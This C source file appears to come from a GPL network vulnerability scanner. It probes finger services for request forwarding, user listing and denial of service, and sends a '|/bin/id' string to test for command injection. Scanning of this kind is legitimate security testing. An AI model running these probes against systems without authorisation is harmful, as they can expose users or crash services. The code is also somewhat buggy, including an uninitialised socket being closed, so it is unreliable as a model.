/*
 *  finscan.c -- Gate network code
 *
 *  ORIGINAL AUTHOR: Stas Lanford (stas@netsis.com)
 *
 *  This program is free software; you can redistribute it and/or
 *  modify it under the terms of the GNU General Public License
 *  as published by the Free Software Foundation; either version 2
 *  of the License, or (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
 */


 

#include "net.h"
#include "interface.h"
#include "util.h"






void f_exploit(int sockfd, char buf[20], char *sbuf) {

	char str[25];

	memset((char *)sbuf, 0, 5000);
	sprintf(str, "%s\n\r", buf);
	if (sock_write(sockfd, str, sizeof(str)) < 0) {
		perror("sock_write");
		exit(1);
	}
	if (sock_read(sockfd, sbuf, 5000) < 0) {
		perror("sock_read");
		exit(1);
	}
}



	

int finscan(char **host)
{

	int sockfd;
	char *sbuf;
	int index;
	FILE *log;

	log = openlog();


	 
	if ((sbuf = malloc(5000)) == NULL) {
		printf("memory allocation failure.\n");
		exit(1);
	}

	for (index=0; host[index]!=NULL; index++) { 


		close(sockfd);
		if (f_connect(host[index], &sockfd) < 0) {
			fprintf(log,"%s: Finger service not found.\n", host[index]);
			break;
		}
		else { 
			fprintf(log, "%s: Finger service detected.\n\n", host[index]);
		}


		f_connect(host[index], &sockfd);
		f_exploit(sockfd, "@", sbuf);
	/*	fprintf(log, "-%s-\n", sbuf); */
		if (strstr(sbuf, FIN_NEEDLE1) == NULL) {
			fprintf(log, "%s: Finger forwarding might be allowed.\n", host[index]); 
		} else { 
			fprintf(log, "%s: Finger forwarding not allowed.\n", host[index]); 
		}
	
	
		f_connect(host[index], &sockfd);
		f_exploit(sockfd, "|/bin/id", sbuf);
		if (strstr(sbuf, FIN_NEEDLE2) != NULL) {
			fprintf(log, "%s: Command execution might be allowed.\n", host[index]);
		} else { 
			fprintf(log, "%s: Command execution not allowed.\n", host[index]); 
		}

	
		f_connect(host[index], &sockfd);
		f_exploit(sockfd, "search.*", sbuf);
		if (strstr(sbuf, FIN_NEEDLE3) != NULL) {
			fprintf(log, "%s: User list displayed.\n", host[index]);
		} else { 
		fprintf(log, "%s: Users remain hidden.\n", host[index]); 
		}
	
	
		f_connect(host[index], &sockfd);
		f_exploit(sockfd, "@@@@@@@@@", sbuf);
		if (strstr(sbuf, FIN_FAIL) == NULL) {
			if (strstr(sbuf, FIN_NEEDLE1) == NULL) {
				fprintf(log, "%s: Finger DoS might be open.\n", host[index]);
			}
		} else {
			fprintf(log,"%s: Finger not DoS'able.\n", host[index]); 
		}
		fprintf(log, "\n");
	}
	fclose(log);
	dialog_clear();
	dialog_textbox(NFS_SCANRES, MAIN_LOG, 20, 60);
	return 0;
}
	

